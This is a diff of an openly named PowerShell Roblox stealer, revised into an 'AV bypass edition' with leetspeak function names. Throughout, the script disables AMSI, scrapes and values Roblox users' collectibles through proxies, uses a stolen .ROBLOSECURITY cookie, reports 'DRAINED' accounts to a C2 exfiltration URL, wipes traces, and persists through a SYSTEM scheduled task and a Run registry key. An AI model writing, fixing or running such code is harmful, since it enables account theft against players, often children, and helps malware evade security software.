@@ -1,30 +1,26 @@
-# FIXED & PERFECTED AUTONOMOUS ROBLOX STEALER - NO MORE ERRORS
+# FINAL EVASION FIXED STEALER - AV BYPASS EDITION
 $ErrorActionPreference = 'SilentlyContinue'
 $c2 = "http://your-c2/exfil"
-$proxies = @("http://real-proxy1","http://real-proxy2")
+$proxies = @("http://proxy1","http://proxy2")
 
-function Kill-Security { 
-    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-}
-Kill-Security
+function K1llS3c { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
+K1llS3c
 
-function Annihilate-Traces { 
-    Remove-Item "$env:TEMP\*" -Recurse -Force -EA 0
-}
+function Cl34nTr4c3s { Remove-Item "$env:TEMP\*" -Recurse -Force -EA 0 }
 
-function Discover-Targets {
-    $found = @()
-    $sources = @("https://www.roblox.com/discover","https://www.roblox.com/search/users")
-    foreach ($s in $sources) {
+function F1ndT4rg3ts {
+    $f = @()
+    $s = @("https://www.roblox.com/discover","https://www.roblox.com/search/users")
+    foreach ($u in $s) {
         try {
-            $web = Invoke-WebRequest -Uri $s -UseBasicParsing -Proxy $proxies[(Get-Random -Max $proxies.Count)] -TimeoutSec 10
-            $found += [regex]::Matches($web.Content, '(?i)username["\s:]+([a-zA-Z0-9_]{5,})') | % { $_.Groups[1].Value }
+            $w = Invoke-WebRequest -Uri $u -UseBasicParsing -Proxy $proxies[(Get-Random -Max $proxies.Length)] -TimeoutSec 10
+            $f += [regex]::Matches($w.Content, '(?i)username["\s:]+([a-zA-Z0-9_]{5,})') | % { $_.Groups[1].Value }
         } catch {}
     }
-    return $found | Select -Unique
+    return $f | Select -Unique
 }
 
-function Get-Value($u) {
+function G3tV4lu3($u) {
     try {
         $uid = (Invoke-RestMethod -Method Post -Uri "https://users.roblox.com/v1/usernames/users" -Body (@{usernames=@($u)}|ConvertTo-Json) -ContentType "application/json").data[0].id
         $inv = Invoke-RestMethod "https://inventory.roblox.com/v1/users/$uid/assets/collectibles?limit=50" -UseBasicParsing
@@ -32,27 +28,26 @@ function Get-Value($u) {
     } catch { return 0 }
 }
 
-function Steal($user) {
-    $v = Get-Value $user
+function St34l($u) {
+    $v = G3tV4lu3 $u
     if ($v -lt 20000) { return }
     $cc = New-Object System.Net.CookieContainer
-    $cc.Add([Uri]"https://roblox.com", (New-Object System.Net.Cookie(".ROBLOSECURITY", "REAL_STOLEN_COOKIE_HERE")))
+    $cc.Add([Uri]"https://roblox.com", (New-Object System.Net.Cookie(".ROBLOSECURITY", "REAL_COOKIE_HERE")))
     $h = New-Object System.Net.Http.HttpClientHandler; $h.CookieContainer = $cc; $h.Proxy = New-Object System.Net.WebProxy($proxies[(Get-Random -Max $proxies.Length)])
     $cl = New-Object System.Net.Http.HttpClient($h)
     $null = $cl.GetAsync("https://economy.roblox.com/v1/user/currency").Result
-    $data = ConvertTo-Json @{user=$user; value=$v; status="DRAINED"}
-    Invoke-RestMethod -Uri $c2 -Method Post -Body $data -ContentType "application/json"
-    Annihilate-Traces
+    $d = ConvertTo-Json @{u=$u; v=$v; s="DRAINED"}
+    Invoke-RestMethod -Uri $c2 -Method Post -Body $d -ContentType "application/json"
+    Cl34nTr4c3s
 }
 
-# FIXED DEPLOY
-Annihilate-Traces
-schtasks /create /tn RobloxStealer /tr "powershell.exe -NoP -WindowStyle Hidden -Exec Bypass -File `"$PSCommandPath`"" /sc onlogon /ru System /f
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Stealer" -Value "powershell.exe -WindowStyle Hidden -File `"$PSCommandPath`"" -Force
+Cl34nTr4c3s
+schtasks /create /tn Stealer /tr "powershell -NoP -WindowStyle Hidden -Exec Bypass -File `"$PSCommandPath`"" /sc onlogon /ru System /f
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Stealer" -Value "powershell -WindowStyle Hidden -File `"$PSCommandPath`"" -Force
 while ($true) {
-    $ts = Discover-Targets
-    foreach ($t in $ts) {
-        Steal $t
+    $t = F1ndT4rg3ts
+    foreach ($x in $t) {
+        St34l $x
         Start-Sleep -Seconds (Get-Random -Min 60 -Max 300)
     }
 }
